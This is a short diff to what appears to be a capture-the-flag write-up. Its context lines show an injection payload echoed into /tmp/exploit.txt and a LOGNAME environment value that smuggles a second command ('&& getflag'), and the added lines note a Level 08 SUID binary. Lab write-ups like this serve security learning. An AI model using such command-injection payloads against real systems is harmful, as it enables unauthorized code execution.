@@ -111,3 +111,7 @@ echo '[x {${`getflag`}}]' > /tmp/exploit.txt
 
 - Change LOGNAME env variable to malicious
 ```export LOGNAME="coucou && getflag | cat"```
+
+# Level 08
+- Available file
+=> Binary SUID executed as flag08 and token
